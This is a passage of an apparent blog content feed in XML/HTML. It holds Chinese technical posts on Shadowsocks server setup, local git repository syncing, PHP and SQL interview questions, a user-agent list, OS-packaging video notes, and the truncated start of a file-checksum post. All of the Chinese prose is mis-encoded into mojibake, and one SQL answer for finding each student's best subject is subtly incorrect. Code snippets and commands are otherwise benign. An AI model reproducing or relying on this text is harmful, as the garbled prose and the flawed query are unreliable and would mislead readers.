class="string">"pass3"</span>,</span><br><span class="line">       <span class="attr">"8384"</span>:<span class="string">"pass4"</span></span><br><span class="line">       &#125;,</span><br><span class="line">  <span class="attr">"timeout"</span>:<span class="number">60</span>,</span><br><span class="line">  <span class="attr">"method"</span>:<span class="string">"rc4-md5"</span>,</span><br><span class="line">  <span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"workers"</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-è®¾ç½®shadowsockså¼€æœºè‡ªå¯"><a href="#6-è®¾ç½®shadowsockså¼€æœºè‡ªå¯" class="headerlink" title="6. è®¾ç½®shadowsockså¼€æœºè‡ªå¯"></a>6. è®¾ç½®shadowsockså¼€æœºè‡ªå¯</h3><p><code>vi /etc/systemd/system/shadowsocks.service</code><br>å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Shadowsocks</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">TimeoutStartSec=0</span><br><span class="line">ExecStart=/usr/bin/ssserver -c /etc/shadowsocks/config.json</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨ shadowsocks æœåŠ¡ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="keyword">enable</span> shadowsocks</span><br><span class="line">systemctl <span class="keyword">start</span> shadowsocks</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤<code>systemctl status shadowsocks</code>æŸ¥çœ‹ssçŠ¶æ€<br>å¦‚æœ shadowsocks å¯åŠ¨å¤±è´¥ï¼Œå¯æ ¹æ®æ—¥å¿— <code>/var/log/shadowsocks.log</code> ä¿¡æ¯è¿›è¡Œæ’æŸ¥ã€‚</p><hr><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://php-rmcr7.rhcloud.com/shadowsocks-server/" target="_blank" rel="noopener">æ•™ä½ å¦‚ä½•æ­å»ºè‡ªå·±çš„ShadowsocksæœåŠ¡å™¨</a></li><li><a href="https://yuyii.com/2015/12/28/shadowsocks-systemd/" target="_blank" rel="noopener">Shadowsocks systemd é…ç½®</a></li><li><a href="https://morning.work/page/2015-12/install-shadowsocks-on-centos-7.html" target="_blank" rel="noopener">åœ¨ CentOS 7 ä¸‹å®‰è£…é…ç½® shadowsocks</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœ¬åœ°gitä»“åº“é—´çš„é€šä¿¡</title>
      <link href="/post/communication-with-local-repo/"/>
      <url>/post/communication-with-local-repo/</url>
      
        <content type="html"><![CDATA[<p>åŒä¸€å°ç”µè„‘çš„ä¸¤ä¸ªgitä»“åº“é—´å¦‚ä½•é€šä¿¡å‘¢ï¼Ÿ</p><a id="more"></a><p>é¦–å…ˆè¦æ˜ç¡®ä¸€ç‚¹ï¼šgitæ˜¯<strong>åˆ†å¸ƒå¼</strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·ã€‚ä¹Ÿå°±æ˜¯è¯´å„ä¸ªgitä»“åº“é—´æ˜¯<strong>ç›¸äº’ç‹¬ç«‹</strong>çš„ã€‚</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬åœ¨<code>admin</code>å®¶ç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªgitä»“åº“ï¼Œåˆ†åˆ«å–åä¸º<code>t1</code>å’Œ<code>t2</code>ï¼š</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[admin<span class="meta">@bravo</span> ~]$ git init t1</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> <span class="regexp">/home/</span>admin<span class="regexp">/t1/</span>.git/</span><br><span class="line">[admin<span class="meta">@bravo</span> ~]$ git init t2</span><br><span class="line">Initialized empty Git repository <span class="keyword">in</span> <span class="regexp">/home/</span>admin<span class="regexp">/t2/</span>.git/</span><br><span class="line">[admin<span class="meta">@bravo</span> t1]$</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œè¿›å…¥t1ç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ªåä¸ºt1çš„æ–‡ä»¶ï¼Œå¹¶åŠ å…¥gitè·Ÿè¸ª</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ touch <span class="built_in">t1</span></span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ git <span class="keyword">add </span>.</span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$ git commit -m <span class="string">'create t1'</span></span><br><span class="line">[master (root-commit) <span class="number">701</span>f<span class="number">8b</span>8] create <span class="built_in">t1</span></span><br><span class="line"> <span class="number">0</span> files changed, <span class="number">0</span> <span class="keyword">insertions(+), </span><span class="number">0</span> deletions(-)</span><br><span class="line"> create mode <span class="number">100644</span> <span class="built_in">t1</span></span><br><span class="line">[admin@<span class="keyword">bravo </span><span class="built_in">t1</span>]$</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œè¿›å…¥t2ç›®å½•ï¼Œå¹¶å…³è”t1ä»“åº“</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">admin</span>@bravo t1]$ cd ../t2</span><br><span class="line">[<span class="keyword">admin</span>@bravo t2]$ git remote <span class="keyword">add</span> t1 /home/<span class="keyword">admin</span>/t1</span><br><span class="line">[<span class="keyword">admin</span>@bravo t2]$ git remote -vv</span><br><span class="line">t1/home/<span class="keyword">admin</span>/t1 (<span class="keyword">fetch</span>)</span><br><span class="line">t1/home/<span class="keyword">admin</span>/t1 (push)</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæ‹‰å–t1ç›®å½•ä¸­çš„æ–‡ä»¶</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">admin@</span>bravo t2]$ git fetch t1</span><br><span class="line">remote: Counting objects: <span class="number">3</span>, done.</span><br><span class="line">remote: Total <span class="number">3</span> (delta <span class="number">0</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line">Unpacking objects: <span class="number">100</span>% (<span class="number">3</span>/<span class="number">3</span>), done.</span><br><span class="line">From /home/admin/t1</span><br><span class="line"> * [new branch]      master     -&gt; t1/master</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$ git merge t1/master</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$ ls</span><br><span class="line">t1</span><br><span class="line">[<span class="symbol">admin@</span>bravo t2]$</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œç°åœ¨ä½ å°±å¯ä»¥åœ¨t2ä»“åº“ä¸­åŒæ­¥åˆ°t1ä»“åº“ä¸­çš„å†…å®¹äº†ï¼Œç”±äºgitèƒ½å¤Ÿç²¾ç¡®åˆ°è¡Œï¼Œå› æ­¤å¾ˆæ–¹ä¾¿æ–‡ä»¶å†²çªçš„è§£å†³ã€‚</p><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œè¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ<br>åœ¨æˆ‘ä»¬å¼€å‘æ—¶ï¼Œç»å¸¸æ˜¯å‰åç«¯åˆ†ç¦»çš„ï¼Œè€Œä¸”å¤§å®¶çš„ä»£ç éƒ½åœ¨åŒä¸€å°æµ‹è¯•æœåŠ¡å™¨ä¸Šï¼Œä¸€ä¸ªå®Œæ•´çš„åŠŸèƒ½éœ€è¦å‰åç«¯ä»£ç åˆå¹¶åæ‰èƒ½æµ‹è¯•ï¼Œè¿™ç§æ–¹å¼å°±èƒ½å®Œç¾åˆå¹¶å‰åç«¯ä»£ç äº†ã€‚</p><p>æ³¨æ„ï¼šé¦–å…ˆè¦å¯¹è¢«æ‹‰å–ä»£ç çš„ç›®å½•æ‹¥æœ‰è¯»å–æƒé™ï¼Œä¹Ÿå°±æ˜¯t1ç›®å½•è¦æœ‰ræ‰èƒ½æ‰§è¡Œä¸Šè¿°æ“ä½œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€äº›å¸¸è§çš„PHPé¢è¯•é¢˜</title>
      <link href="/post/php-interview/"/>
      <url>/post/php-interview/</url>
      
        <content type="html"><![CDATA[<p>è¿™éƒ½æ˜¯æˆ‘é¢è¯•çš„è¡€æ³ªå²å•Š:(</p><a id="more"></a><h3 id="ä¸€ã€-æ•°ç»„åŠä¼ å€¼æ–¹å¼çš„è€ƒå¯Ÿ"><a href="#ä¸€ã€-æ•°ç»„åŠä¼ å€¼æ–¹å¼çš„è€ƒå¯Ÿ" class="headerlink" title="ä¸€ã€ æ•°ç»„åŠä¼ å€¼æ–¹å¼çš„è€ƒå¯Ÿ"></a>ä¸€ã€ æ•°ç»„åŠä¼ å€¼æ–¹å¼çš„è€ƒå¯Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $arr = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>];</span><br><span class="line">  <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$v) &#123;</span><br><span class="line">  <span class="comment"># code...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">  <span class="comment"># code...</span></span><br><span class="line">  &#125;</span><br><span class="line">  print_r($arr);</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯$arr = [â€˜aâ€™,â€™bâ€™,â€™bâ€™]ï¼Œä½ ç­”å¯¹äº†å—ï¼Ÿ</p><p>åæ­£æˆ‘æ˜¯æƒ³äº†ä¸€ä¸ªç¤¼æ‹œæ‰å¼„æ˜ç™½:)</p><p>è§£æï¼šè¿™é“é¢˜é¦–å…ˆè¦æ³¨æ„ç¬¬ä¸€æ¬¡å¾ªç¯ä¸­çš„â€&amp;â€ç¬¦å·ï¼Œè€ƒå¯Ÿçš„æ˜¯PHPä¸­çš„å¼•ç”¨èµ‹å€¼å’Œæ‹·è´èµ‹å€¼ã€‚</p><p>  æœ€åå‡ºç°â€œä»¤äººæ„å¤–â€çš„ç»“æœçš„åŸå› å°±åœ¨äºï¼Œç¬¬ä¸€æ¬¡å¾ªç¯æ˜¯æ¯æ¬¡æŠŠ$arrå…ƒç´ çš„åœ°å€ç»™äº†$vï¼Œè€Œ$vçš„åœ°å€åœ¨å¾ªç¯ç»“æŸåæœ‰æ²¡è¢«é‡Šæ”¾æ‰ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å¾ªç¯ç»“æŸå$vå­˜çš„æ˜¯$arr[2]çš„<strong>åœ°å€</strong>ï¼Œç¬¬äºŒæ¬¡å¾ªç¯æ˜¯æŠŠ$arrçš„å€¼åˆ†åˆ«ç»™äº†$vï¼Œç”±äºæ­¤æ—¶çš„$væŒ‡å‘çš„æ˜¯$arr[2]ï¼Œæ‰€ä»¥æ¯æ¬¡æŒ‡é’ˆçš„ç§»åŠ¨éƒ½æ˜¯æŠŠå½“å‰çš„å…ƒç´ æ”¾å…¥$arr[2]ä¸­ï¼Œæ‰€ä»¥</p><ul><li>ç¬¬ä¸€æ¬¡å¾ªç¯$arr = [â€˜aâ€™,â€™bâ€™,â€™aâ€™];</li><li>ç¬¬äºŒæ¬¡å¾ªç¯$arr = [â€˜aâ€™,â€™bâ€™,â€™bâ€™];</li><li>ç¬¬ä¸‰æ¬¡å¾ªç¯$arr = [â€˜aâ€™,â€™bâ€™,â€™bâ€™];</li></ul><p>ç¬¬ä¸‰æ¬¡å¾ªç¯çš„ç»“æœå°±æ˜¯æŠŠè‡ªå·±çš„$arr[2]çš„å†…å®¹å–å‡ºæ¥èµ‹ç»™$arr[2]ï¼Œæ‰€ä»¥ç»“æœæ˜¯$arr = [â€˜aâ€™,â€™bâ€™,â€™bâ€™];</p><p>å› æ­¤æˆ‘ä»¬<strong>åœ¨ä½¿ç”¨â€&amp;â€ç¬¦å·æ—¶ï¼Œæœ€å¥½å°†å…¶unsetæ‰ï¼Œå¦åˆ™ä¼šå¯¼è‡´æ„å¤–è¡Œä¸º</strong>ã€‚</p><p>æœ€åä¸Šä¸€ä¸ªå›¾è¯´æ˜ä¸€ä¸‹ï¼š<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qz4al32j31400u01ky.jpg" alt="foreaché—®é¢˜"></p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://segmentfault.com/q/1010000008279730" target="_blank" rel="noopener">https://segmentfault.com/q/1010000008279730</a></p><hr><h3 id="äºŒã€-æ•°ç»„çš„è€ƒå¯Ÿ"><a href="#äºŒã€-æ•°ç»„çš„è€ƒå¯Ÿ" class="headerlink" title="äºŒã€ æ•°ç»„çš„è€ƒå¯Ÿ"></a>äºŒã€ æ•°ç»„çš„è€ƒå¯Ÿ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">9</span>;</span><br><span class="line">$t = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">foreach</span>($t <span class="keyword">as</span> $v)</span><br><span class="line">&#123;</span><br><span class="line">$v += $a;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($t);</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯<code>1</code>è€Œä¸æ˜¯<code>10</code>ã€‚</p><hr><h3 id="ä¸‰ã€-SQLçš„è€ƒå¯Ÿ"><a href="#ä¸‰ã€-SQLçš„è€ƒå¯Ÿ" class="headerlink" title="ä¸‰ã€ SQLçš„è€ƒå¯Ÿ"></a>ä¸‰ã€ SQLçš„è€ƒå¯Ÿ</h3><p>ç°æœ‰ä¸€ä¸ªå­¦ç”Ÿæˆç»©è¡¨student,å†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qzmqr16j306f076aai.jpg" alt="å­¦ç”Ÿæˆç»©è¡¨"></p><p>è¯·æ®è¡¨æŸ¥è¯¢ï¼Œ</p><ol><li>ç”¨ä¸€ä¸ªselectæŸ¥å‡ºä¸¤é—¨åŠä»¥ä¸Šçš„ä¸åŠæ ¼è€…çš„å¹³å‡æˆç»©</li><li>ç»Ÿè®¡å­¦ç”Ÿä¸åŠæ ¼ç§‘ç›®çš„ä¸ªæ•°</li><li>è·å–æ¯ä¸ªå­¦ç”Ÿçš„æœ€ä½³ç§‘ç›®åŠæˆç»©</li><li>è·å–ä¸åŠæ ¼å­¦ç”Ÿçš„åå­—åŠç§‘ç›®</li></ol><p>ç­”ï¼š</p><ol><li><p><code>select name, sum(score&lt;60) as num, avg(score) as avg_score  from student  group by name having num &gt; 1;</code><br><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r08xv3fj306o03sq35.jpg" alt="ä¸¤é—¨åŠä»¥ä¸Šä¸åŠæ ¼çš„å¹³å‡åˆ†"></p></li><li><p><code>select name, sum(score &lt; 60) as no_pass from student group by name;</code><br><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r0z7h21j305i04ldfy.jpg" alt="ä¸åŠæ ¼ç§‘ç›®æ•°"></p></li><li><p><code>select name, subject, score from student where score in (select max(score) as score from student group by name);</code><br><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r1fdhe0j306k04hweq.jpg" alt="æœ€ä½³ç§‘ç›®åŠæˆç»©"></p></li></ol><ol start="4"><li><code>select name, group_concat(subject) as subject from (select name, subject from student where score &lt; 60) as info group by name;</code>//æ­¤å¤„éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­æŸ¥è¯¢è¯­å¥ç»“æœéœ€è¦ç»™ä¸€ä¸ªaliasï¼Œå¦åˆ™ä¼šæŠ¥é”™<br><br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r2gr4v4j307i04imxe.jpg" alt="ä¸åŠæ ¼ç§‘ç›®åˆ—è¡¨"></li></ol>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UAåˆ—è¡¨</title>
      <link href="/post/browser-user-agent-list/"/>
      <url>/post/browser-user-agent-list/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g87d074zw5j30b4069glv.jpg" alt=""></p><a id="more"></a><p>å¸¸è§UAåˆ—è¡¨å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">BROWSER</th><th align="center">USER AGENT</th></tr></thead><tbody><tr><td align="center">Safari 10.0</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50</td></tr><tr><td align="center">Safari 10.0-iOS10-iPhone</td><td align="center">Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Safari 10.0-iOS10-iPod touch</td><td align="center">Mozilla/5.0 (iPod; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Safari 10.0-iOS10-iPad</td><td align="center">Mozilla/5.0 (iPad; CPU OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1</td></tr><tr><td align="center">Microsoft Edge</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/13.10586</td></tr><tr><td align="center">Internet Explorer  11</td><td align="center">Mozilla/5.0 (Windows NT 6.3; Win64, x64; Trident/7.0; rv:11.0) like Gecko</td></tr><tr><td align="center">Internet Explorer  10</td><td align="center">Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)</td></tr><tr><td align="center">Internet Explorer  9</td><td align="center">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)</td></tr><tr><td align="center">Internet Explorer  8</td><td align="center">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)</td></tr><tr><td align="center">Internet Explorer  7</td><td align="center">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)</td></tr><tr><td align="center">Google Chrome - Mac</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</td></tr><tr><td align="center">Google Chrome - Windows</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36</td></tr><tr><td align="center">Firefox - Mac</td><td align="center">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:46.0) Gecko/20100101 Firefox/46.0</td></tr><tr><td align="center">Firefox - Windows</td><td align="center">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ“ä½œç³»ç»Ÿå°è£…å°æ„Ÿ</title>
      <link href="/post/encapsule-os-notes/"/>
      <url>/post/encapsule-os-notes/</url>
      
        <content type="html"><![CDATA[<p><embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=8679165&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash"></embed></p><a id="more"></a><hr><p>ç»è¿‡è¿‘ä¸€å‘¨çš„å¥‹æˆ˜ï¼Œç»ˆäºæŠŠå»å¹´8æœˆå°±æƒ³å½•åˆ¶çš„ç³»ç»Ÿå°è£…æ•™ç¨‹å½•åˆ¶å‰ªè¾‘å®Œæ¯•äº†ï¼Œç°å·²ä¸Šçº¿ï¼š</p><p>Bilibili : <a href="http://www.bilibili.com/video/av8679165/" target="_blank" rel="noopener">http://www.bilibili.com/video/av8679165/</a></p><p>YouTube : <a href="https://www.youtube.com/watch?v=urmczmqsHn4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=urmczmqsHn4</a></p><p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¡®å®å­¦åˆ°äº†ä¸å°‘ï¼Œä¹ŸæŠ˜è…¾äº†ä¸å°‘ï¼Œé¦–å…ˆæ˜¯è·ç¦»ä¸Šæ¬¡å°è£…å·²ç»æœ‰åŠå¹´äº†ï¼Œè‡ªå·±è®°å¿†æ¨¡ç³Šï¼Œç„¶åæ˜¯ç¬¬ä¸€æ¬¡å½•åˆ¶ï¼Œä¸Šæ¥ç›´æ¥å¼€å½•ï¼Œå¯¼è‡´æ¨åˆ°ä¸¤ä¸‰æ¬¡ï¼Œæœ€åå°±æ˜¯Castasiaã€Premiereã€After Effectç­‰è½¯ä»¶çš„ä½¿ç”¨ï¼Œæ¯•ç«Ÿæ–°æ‰‹ï¼Œç”¨èµ·æ¥æ€»æ˜¯ç£•ç£•ç¢°ç¢°ï¼Œæ‰€å¹¸æœ€ç»ˆæ•™ç¨‹é¡ºåˆ©ä¸Šçº¿ï¼Œè‡ªå·±ä¹Ÿæ€»ç»“ä¸€ä¸‹æœ¬æ¬¡çš„ç»éªŒï¼Œä»¥ä¾¿ä»Šåå‚è€ƒï¼š</p><ol><li>å½•åˆ¶è§†é¢‘å‰ï¼Œè‡ªå·±è¦å…ˆæŠŠå½•åˆ¶çš„å†…å®¹èµ°ä¸€éï¼Œå°½å¯èƒ½ä½¿å½•åˆ¶ä¸€æ°”å‘µæˆã€‚å¯ä»¥æŠŠå½•åˆ¶å†…å®¹æ‹†åˆ†æ­¥éª¤ï¼Œè®°å½•åœ¨æ—è¾¹ï¼Œå‡å°‘å‡ºé”™ã€‚å¯¹äºè‡ªå·±å‡ºç°çš„é—®é¢˜åœ¨åæœŸå¤„ç†æ—¶é‡ç‚¹æ ‡å‡º</li><li>å¯¹äºä¸€äº›æ–‡å­—å†…å®¹ï¼Œå¯ä»¥é€‚å½“æ”¾å¤§å±å¹•æ¥æé«˜ä½“éªŒï¼Œè¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡Premiereçš„æ•ˆæœæ§ä»¶ä¸­çš„ç¼©æ”¾æ¥å®ç°</li><li>å¯¹äºä¸€äº›ä¸å¿…è¦çš„è¿‡ç¨‹ï¼Œå¯é€‚å½“è¿›è¡Œå‰ªè¾‘ï¼Œå€é€Ÿæ’­æ”¾ç­‰</li><li>åœ¨æ•´ä¸ªå½•åˆ¶è¿‡ç¨‹ä¸­ï¼Œè€—æ—¶å¾ˆå¤šçš„å‡ ä¸ªæ­¥éª¤æ˜¯ï¼š<ul><li>ç³»ç»Ÿæ‰“è¡¥ä¸ï¼ˆè¿‘3å°æ—¶ï¼‰</li><li>é•œåƒæ–‡ä»¶çš„ä¿å­˜ï¼ˆ1å°æ—¶å·¦å³ï¼‰</li><li>wimè½¬esdæ ¼å¼ï¼ˆ2å°æ—¶ï¼‰</li><li>Castasiaä¿å­˜å½•åˆ¶çš„åŸç”Ÿè§†é¢‘ï¼ˆ1å°æ—¶ï¼‰</li><li>Prå¯¼å‡ºå‰ªè¾‘å¥½çš„è§†é¢‘ï¼ˆ1å°æ—¶ï¼‰</li></ul></li><li>æœ¬æ¬¡å½•åˆ¶ä½¿ç”¨äº†VMwareå°è£…ã€Castasia 9.0å½•å±ã€Premiereå‰ªè¾‘ã€After Effectæ·»åŠ å­—å¹•</li><li>åœ¨æœ€åçš„ä¸Šä¼ ä¸­ï¼Œç”±äºYouTubeå¼ºå¤§çš„Content IDæœºåˆ¶ï¼Œæˆ‘å…¶ä¸­çš„ä¸€æ®µèƒŒæ™¯éŸ³ä¹å› ä¸ºä¾µæƒè€Œå¯¼è‡´æ•´ä¸ªè§†é¢‘éƒ½è¢«é™éŸ³ï¼Œæœ€åç§»é™¤è¯¥æ®µéŸ³ä¹è§£å†³ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r7gqfdkj30rx053jsk.jpg" alt="YouTube éŸ³ä¹ç‰ˆæƒ"></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç³»ç»Ÿå°è£… </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macå’ŒCentOSå‘½ä»¤è¡Œä¸‹æ–‡ä»¶æ ¡éªŒ</title>
      <link href="/post/file-chek-on-terminal/"/>
      <url>/post/file-chek-on-terminal/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cn5iehl5j30he08xt9l.jpg" alt=""></p><a id="more"></a><p>ã€€ã€€ä½ ä»äº’è”ç½‘ä¸Šä¸‹è½½äº†æŸä¸ªæ–‡ä»¶(æ¯”å¦‚å®‰è£…ç¨‹åºã€ISOæ˜ åƒæ–‡ä»¶æˆ–å‹ç¼©æ–‡ä»¶)åï¼Œè¯¥æ–‡ä»¶å¯èƒ½å› å„ç§é”™è¯¯æƒ…å½¢è€Œé­åˆ°æŸåï¼Œæ¯”å¦‚ç”±äºç½‘ç»œè¿æ¥ä¸Šçš„ä¼ è¾“é”™è¯¯ã€ä¸‹è½½å—åˆ°ä¸­æ–­ã€å­˜å‚¨ç¡¬ä»¶æœ‰æ•…éšœã€æ–‡ä»¶ç³»ç»Ÿé”™è¯¯ç­‰ã€‚æŠ›å¼€æ­¤ç±»é”™è¯¯æƒ…å½¢ä¸è¯´ï¼Œæ–‡ä»¶è¿˜æœ‰å¯èƒ½è¢«æ”»å‡»è€…åœ¨ä¸‹è½½è¿‡ç¨‹ä¸­æˆ–ä¸‹è½½å‰æ¶æ„ç¯¡æ”¹ã€‚æ¯”å¦‚è¯´ï¼Œæ”»å‡»è€…å¯¹è®¤è¯ä¸­å¿ƒåšæ‰‹è„šåï¼Œå°±èƒ½å‘åŠ¨ä¸­é—´äºº(MITM)æ”»å‡»ï¼Œå¼•è¯±ä½ ä»å‡å†’çš„HTTPSç½‘ç«™ä¸‹è½½æ„ŸæŸ“äº†æ¶æ„è½¯ä»¶çš„æ–‡ä»¶ã€‚</p><p>ã€€ã€€ä¸ºäº†ä¿æŠ¤è‡ªå·±è¿œç¦»è¿™äº›ç§ç±»çš„é—®é¢˜ï¼Œä½ ä»äº’è”ç½‘ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¸¸å¸¸å»ºè®®éªŒè¯æ–‡ä»¶çš„çœŸå®æ€§å’Œå®Œæ•´æ€§ã€‚å°¤å…¶æ˜¯ä½ ä¸‹è½½äº†ç›¸å½“æ•æ„Ÿçš„æ–‡ä»¶(æ¯”å¦‚æ“ä½œç³»ç»Ÿæ˜ åƒæ–‡ä»¶ã€åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶ä»£ç å’Œå¯æ‰§è¡Œçš„å®‰è£…ç¨‹åºç­‰)åï¼Œç›²ç›®åœ°ç›¸ä¿¡å·²ä¸‹è½½æ–‡ä»¶å¯ä¸æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚</p><p>åœ¨Macå¹³å°ä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è¿›è¡Œæ 